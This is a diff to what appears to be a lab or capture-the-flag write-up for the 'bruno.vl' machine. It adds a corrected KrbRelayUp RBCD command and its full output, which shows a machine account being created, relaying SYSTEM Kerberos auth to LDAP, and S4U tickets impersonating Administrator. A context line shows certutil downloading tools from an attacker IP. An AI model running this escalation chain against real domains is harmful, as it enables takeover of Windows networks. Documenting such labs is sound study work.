@@ -418,6 +418,37 @@ PS C:\Users\svc_scan\Documents> certutil -urlcache -split -f http://10.10.14.90:
 This transferred this to the target
 
 ```python
-./KrbRelayUp.exe full -m rbcd -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3}
+.\KrbRelayUp.exe full -m rbcd -c -cls '{d99e6e73-fc88-11d0-b498-00a0c90312f3}'
+KrbRelayUp - Relaying you to SYSTEM
+
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Computer account "KRBRELAYUP$" added with password "pK2=fZ5=yQ6@bK0@"
+[+] Looking for available ports..
+[+] Port 10246 available
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+[+] LDAP session established
+[+] RBCD rights added successfully
+[+] TGT request successful!
+[+] Building S4U2self 
+[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
+[+] Sending S4U2self request to fe80::6d16:7385:7694:82f3%5:88
+[+] S4U2self success!
+[+] Got a TGS for 'Administrator' to 'KRBRELAYUP$@BRUNO.VL'
+[+] Impersonating user 'Administrator' to target SPN 'HOST/BRUNODC'
+[+] Building S4U2proxy request for service: 'HOST/BRUNODC'
+[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
+[+] Sending S4U2proxy request to domain controller fe80::6d16:7385:7694:82f3%5:88
+[+] S4U2proxy success!
+[+] Importing ticket into a sacrificial process using CreateNetOnly
+[+] Process         : 'C:\Users\svc_scan\Documents\KrbRelayUp.exe krbscm --ServiceName "KrbSCM"' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 348
+[+] Ticket successfully imported!
+[+] LUID            : 0x685960
+[+] System service should be started in background
 ```
 
